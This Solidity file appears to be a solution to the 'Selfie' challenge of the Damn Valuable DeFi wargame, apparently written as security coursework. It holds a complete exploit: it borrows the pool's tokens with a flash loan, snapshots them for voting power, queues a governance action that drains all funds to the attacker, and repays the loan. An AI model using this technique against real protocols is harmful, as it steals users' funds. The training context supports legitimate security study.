// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "week10-11-security2/DamnValuableTokenSnapshot.sol";
import "week10-11-security2/selfie/SimpleGovernance.sol";
import "week10-11-security2/selfie/SelfiePool.sol";

contract SelfieAttacker {
    SelfiePool pool;
    // ERC20Snapshot token;
    SimpleGovernance gov;
    address owner;
    uint256 actionId;

    constructor(SelfiePool pool_) {
        pool = pool_;
        gov = pool.governance();
        owner = msg.sender;
        // token = pool.token();
    }

    function attack() external {
        // Take out a loan
        uint256 balance = pool.token().balanceOf(address(pool));
        pool.flashLoan(balance);

        // Attack continues in flash-loan receiver
    }

    function finish() external {
        // After waiting two days, the funds can be drained
        gov.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot dvt = DamnValuableTokenSnapshot(token);

        // Take snapshot
        dvt.snapshot();

        // Queue action to drain funds, sending results to owner
        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSelector(SelfiePool.drainAllFunds.selector, owner),
            0
        );

        // Return flash-loan funds
        ERC20Snapshot(token).transfer(address(pool), amount);
    }
}
